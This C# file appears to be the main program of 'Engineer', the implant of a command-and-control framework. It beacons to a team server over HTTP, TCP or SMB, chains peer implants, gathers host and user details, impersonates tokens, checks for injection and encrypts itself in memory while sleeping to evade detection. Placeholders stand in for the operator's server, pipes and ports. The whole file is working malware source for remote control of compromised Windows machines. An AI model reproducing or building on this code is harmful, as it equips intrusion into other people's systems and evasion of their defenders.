﻿using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;

namespace Engineer
{
    public class Program
    {
        public static EngCommBase _commModule;
        private static CancellationTokenSource _tokenSource;
        internal static EngineerMetadata _metadata;
        internal static WindowsIdentity ImpersonatedUser;
        internal static bool ImpersonatedUserChanged = false;
        internal static List<EngineerCommand> _commands = new List<EngineerCommand>(); // Assigned here because its not assigned in main so assigning it somewhere else would localsize the assignment other 3 are assigned the objects in Main func.
        internal static int InboundCommandsRec = 0;
        internal static int OutboundResponsesSent = 0;
        public static string ManagerType = "{{REPLACE_MANAGER_TYPE}}";
        public static ConcurrentDictionary<string, EngTCPComm> TcpChildCommModules = new ConcurrentDictionary<string, EngTCPComm>(); // key is the current engineers children engineerId, value is the TCP comm, for that child
        public static ConcurrentDictionary<string, EngSMBComm> SmbChildCommModules = new ConcurrentDictionary<string, EngSMBComm>(); // key is the current engineers children engineerId, value is the smb comm, for that child
        public static ConcurrentDictionary<string, EngTCPComm> TcpParentCommModules = new ConcurrentDictionary<string, EngTCPComm>(); // key is the current engineers parent engineerId, value is the TCP comm, for that parent, these are only used on TCP engineers
        public static ConcurrentDictionary<string, EngSMBComm> SmbParentCommModules = new ConcurrentDictionary<string, EngSMBComm>(); // key is the current engineers parent engineerId, value is the smb comm, for that parent, these are only used on SMB engineers
        public static bool childIsServer = bool.TryParse("{{REPLACE_CHILD_IS_SERVER}}", out childIsServer) ? childIsServer : false;
        private static string WorkHoursEnd = "{{REPLACE_WORK_HOURS_END}}";      // time of day an operation stops for the day 
        private static string WorkHoursStart = "{{REPLACE_WORK_HOURS_START}}"; // time of day an operation starts for that day
        public static bool IsEncrypted = false;
        public static string UniqueTaskKey = "{{REPLACE_UNIQUE_TASK_KEY}}";
        public static string MessagePathKey = "{{REPLACE_MESSAGE_PATH_KEY}}";
        public static string MetadataKey = "{{REPLACE_METADATA_KEY}}";
        public static int P2PNumber = int.TryParse("{{REPLACE_P2P_NUMBER}}", out P2PNumber) ? P2PNumber : -1;
        public static bool IsTaskExecuting = false;
        public static SleepEnum.SleepTypes Sleeptype = Enum.TryParse("{{REPLACE_SLEEP_TYPE}}", out SleepEnum.SleepTypes sleeptype) ? sleeptype : SleepEnum.SleepTypes.None;
        public static DateTime LastP2PCheckIn = DateTime.Now;

        public static async Task Main(string[] args)
        {
            try
            {
                //PrimeCalc();
                if (ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase))
                {
                    if (childIsServer)
                    {
                        var sleep = int.Parse("{{REPLACE_SLEEP_TIME}}");
                        EngCommBase.Sleep = sleep * 1000;
                       // Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
                        _commModule = new EngSMBComm("{{REPLACE_NAMED_PIPE}}",false); // child as server 
                    }
                    else if (!childIsServer)
                    {
                        var sleep = int.Parse("{{REPLACE_SLEEP_TIME}}");
                        EngCommBase.Sleep = sleep * 1000;
                        //Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
                        _commModule = new EngSMBComm("{{REPLACE_NAMED_PIPE}}","{{REPLACE_CONNECTION_IP}}",false); // child as client
                    }
                }
                else if(ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
                {
                    if (childIsServer)
                    {
                        var sleep = int.Parse("{{REPLACE_SLEEP_TIME}}");
                        EngCommBase.Sleep = sleep * 1000;
                        //Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
                        _commModule = new EngTCPComm(int.Parse("{{REPLACE_LISTEN_PORT}}"), bool.Parse("{{REPLACE_ISLOCALHOSTONLY}}"),false); // child as server 
                    }
                    else if(!childIsServer)
                    {
                        var sleep = int.Parse("{{REPLACE_SLEEP_TIME}}");
                        EngCommBase.Sleep = sleep * 1000;
                        //Console.WriteLine($"sleep time set to {EngCommBase.Sleep}");
                        _commModule = new EngTCPComm(int.Parse("{{REPLACE_BIND_PORT}}"), "{{REPLACE_CONNECTION_IP}}", false); // child as client
                    }    
                }
                else if(ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || ManagerType.Equals("https",StringComparison.CurrentCultureIgnoreCase))
                {
                   _commModule = new EngHttpComm(@"{{REPLACE_CONNECTION_IP}}", int.Parse("{{REPLACE_CONNECTION_PORT}}"), "{{REPLACE_ISSECURE_STATUS}}", int.Parse("{{REPLACE_CONNECTION_ATTEMPTS}}"), int.Parse("{{REPLACE_SLEEP_TIME}}"),"{{REPLACE_URLS}}", "{{REPLACE_COOKIES}}", "{{REPLACE_REQUEST_HEADERS}}", "{{REPLACE_USERAGENT}}");
                }
                else
                {
                    //comm module for testing on connect to 8080 ave ot turn off other one. 
                    Thread.Sleep(15000); // sleep for testing cause i have to start eng with other programs and need time to start a manager. 
                    _commModule = new EngHttpComm(@"127.0.0.1", int.Parse("8080"), "false", int.Parse("1000"), int.Parse("5"),"/index.html,/","SESSIONID","AcceptVALUEjson/application", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246");
                    ManagerType = "http";
                }
                

                GenerateMetadata();
                LoadEngineerCommands();
                _commModule.Init(_metadata);

                if (ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
                {
                    Task.Run(async() =>await _commModule.Start());
                    //Console.WriteLine("tcp engineer comms started");
                }
                else if (ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase))
                {
                    Task.Run(async () => await _commModule.Start());
                   // Console.WriteLine("smb engineer comms started");
                }

                bool isInjected = Functions.InjectionTest.Injection_Test();
                
                _tokenSource = new CancellationTokenSource();
                while (!_tokenSource.IsCancellationRequested) // if Teamserver isnt up or goes down while eng is running it gets stuck in this loop
                {
                    try
                    {
                        if (ImpersonatedUserChanged)
                        {
                            ImpersonatedUser.Impersonate();
                            ImpersonatedUserChanged = false;
                        }

                        if (InboundCommandsRec == OutboundResponsesSent)
                        {
                            IsTaskExecuting = false;
                        }
                        else
                        {
                            IsTaskExecuting = true;
                        }
                        

                        //send task output
                        if (!_commModule.Outbound.IsEmpty)
                        {
                            await _commModule.PostData();   //send task response data to server
                        }
                        else if (ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || ManagerType.Equals("https", StringComparison.CurrentCultureIgnoreCase))
                        {
                            //get tasks
                            await _commModule.CheckIn();      //http checkin with server
                        }
                        if (_commModule.RecvData(out var tasks))
                        {
                            Tasking.DealWithTasks(tasks);
                        }
                        while (!_commModule.P2POutbound.IsEmpty && ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
                        {
                           // Console.WriteLine($"{DateTime.UtcNow} tcp engineer has p2p outbound to put in parents queue");
                            //if this child has a finished task result place it into the queue for the parent to pick up
                            EngTCPComm.ChildToParentData[TcpParentCommModules.Keys.ElementAt(0)].Enqueue(_commModule.P2POutbound.TryDequeue(out var data) ? data : null); 
                        }
                        while (!_commModule.P2POutbound.IsEmpty && ManagerType.Equals("smb", StringComparison.CurrentCultureIgnoreCase))
                        {
                            //Console.WriteLine("smb engineer has p2p outbound to put in parents queue");
                            //if this child has a finished task result place it into the queue for the parent to pick up
                            EngSMBComm.ChildToParentData[SmbParentCommModules.Keys.ElementAt(0)].Enqueue(_commModule.P2POutbound.TryDequeue(out var data) ? data : null); 
                            if (EngSMBComm.ChildToParentData[SmbParentCommModules.Keys.ElementAt(0)].Count > 0)
                            {
                              //  Console.WriteLine("smb engineer queued data for parent");
                            }
                        }
                        //while the parent has data from a child send it to the ts
                        while (!_commModule.P2POutbound.IsEmpty && (ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || ManagerType.Equals("https", StringComparison.CurrentCultureIgnoreCase)))
                        {
                            EngHttpComm test = (EngHttpComm)_commModule;
                            //Console.WriteLine($"{DateTime.UtcNow} http engineer has task response from tcp engineer and is sending to ts");
                            await test.Postp2pData();
                        }
                        
                        //if tasking.EngTaskResults contains any tasks with the status of running then IsTaskExecuting = true
                        if(Tasking.engTaskResultDic.Any(x => x.Value.Status == EngTaskStatus.Running))
                        {
                            IsTaskExecuting = true;
                        }
                        else
                        {
                            IsTaskExecuting = false;
                        }
                        
                        //meed to modify this so it can be interruppted, if another thread finishes a task or p2p data is ready to be sent it shouldnt have to keep waiting for the sleep time to finish
                        if(IsTaskExecuting && EngCommBase.Sleep > 0)
                        {
                            Thread.Sleep(EngCommBase.Sleep);
                        }

                        //sleep and encrypt
                        if (!(IsTaskExecuting) && EngCommBase.Sleep > 1000 && !(isInjected) && EngTCPComm.IsDataInTransit == false && EngSMBComm.IsDataInTransit == false)
                        {
                            IsEncrypted = true;
                            if (Sleeptype == SleepEnum.SleepTypes.Custom_RC4)
                            {
                                Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
                            }
                            else if(Sleeptype == SleepEnum.SleepTypes.None)
                            {
                                Thread.Sleep(EngCommBase.Sleep);
                            }
                            IsEncrypted = false;
                        }
                        else if (!(IsTaskExecuting) && EngTCPComm.IsDataInTransit == false && EngSMBComm.IsDataInTransit == false)
                        {
                            Thread.Sleep(EngCommBase.Sleep);
                            //helps with cpu use on 0 sleep
                            Thread.Sleep(10);
                        }
                        //helps with cpu use
                        Thread.Sleep(10);
                        
                        
                        
                        
                        
                        // //if WorkingHoursEnd equal UTCTimeNow then Sleep until WorkingHoursStart
                        // DateTime endHours;
                        // DateTime startHours;
                        // if (DateTime.TryParse(WorkHoursStart, out startHours))
                        // {
                        //     if (DateTime.TryParse(WorkHoursEnd, out endHours))
                        //     {
                        //        // Console.WriteLine($"endHours is a valid time of {endHours}");
                        //     }
                        //     else
                        //     {
                        //        // Console.WriteLine($"DateTime unable to parse {WorkHoursEnd}");
                        //     }
                        //
                        //     if (endHours.Minute == DateTime.UtcNow.Minute)
                        //     {
                        //         //while the current hour is not the start hour sleep
                        //         while (DateTime.UtcNow.Minute != startHours.Minute)
                        //         {
                        //             if (Sleeptype == SleepEnum.SleepTypes.Custom_RC4)
                        //             {
                        //                 Functions.SleepEncrypt.ExecuteSleep(EngCommBase.Sleep); //if we did not recvData and we have no data to send sleep for a bit
                        //             }
                        //             else if (Sleeptype == SleepEnum.SleepTypes.None)
                        //             {
                        //                 Thread.Sleep(EngCommBase.Sleep);
                        //             }
                        //         }
                        //     }
                        // }
                    }
                    catch (Exception ex)
                    {
                       // Console.WriteLine(ex.Message);
                       // Console.WriteLine(ex.StackTrace);
                    }
                }
                Stop();
            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
               // Console.WriteLine(e.StackTrace);
            }
        }

        
		private static void GenerateMetadata()
        {
            
            var process = Process.GetCurrentProcess();              //loads current process Info
            var identity = WindowsIdentity.GetCurrent();            //The identity object encapsulates information about the user
            var principal = new WindowsPrincipal(identity);         //The principal object represents the security context under which code is running.

            var integrity = "Medium";                               // can be medium because other lines check for IsSystem and is Admin and if not then it must be medium 
            if (identity.IsSystem)                                  // Identity objects have a IsSystem bool property we can check 
            {
                integrity = "SYSTEM";
            }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))  // checks if current principal object is part of the Administrator group because roiles are a security context thing this uses principals
            {
                integrity = "High";
            }

            _metadata = new EngineerMetadata
            {
                Id = Guid.NewGuid().ToString(),                             //takes guid from process and uses that string as the id
                Hostname = Dns.GetHostName(),                         // getting the hostname of the machine
                Address = Dns.GetHostAddresses(Dns.GetHostName()).LastOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork)?.ToString(), // getting the ip address of the machine
                Username = identity.Name,                                  // since identrity is info on the user the name here is just the username  
                ProcessName = process.ProcessName,                         
                ProcessId = process.Id,
                Integrity = integrity,
                Arch = IntPtr.Size == 8 ? "x64" : "x86",     // if intPtr is 8 then it must be 64 bit if not then its 86 bit
                ManagerName = "{{REPLACE_MANAGER_NAME}}",
                Sleep = EngCommBase.Sleep/1000
            };

            process.Dispose();
            identity.Dispose();
        }

        public static void Stop()
        {
            Console.WriteLine("Token cancelled");
            _tokenSource.Cancel();
        }

        public void GetAddresses()
        {
            //return a list of ip addresses that are part of the InterNetwork AddressFamily
            var addresses = Dns.GetHostAddresses(Dns.GetHostName()).Where(a => a.AddressFamily == AddressFamily.InterNetwork).ToList();
        }

        
        

        private static void LoadEngineerCommands()
        {
            var self = Assembly.GetExecutingAssembly(); // calls itself which is the Engineer in this case.

            try
            {
                foreach (var type in self.GetTypes()) // types would be a class in this instance
                {
                    if (type.IsSubclassOf(typeof(EngineerCommand)))  // checks to make sure thing is inside the EngineerCommand class first
                    {
                        var instance = (EngineerCommand)Activator.CreateInstance(type); //returns a class so must be casted to EngineerCommand
                        _commands.Add(instance);
                    }
                }
            }
            catch { }
        }
        
        
    }
}
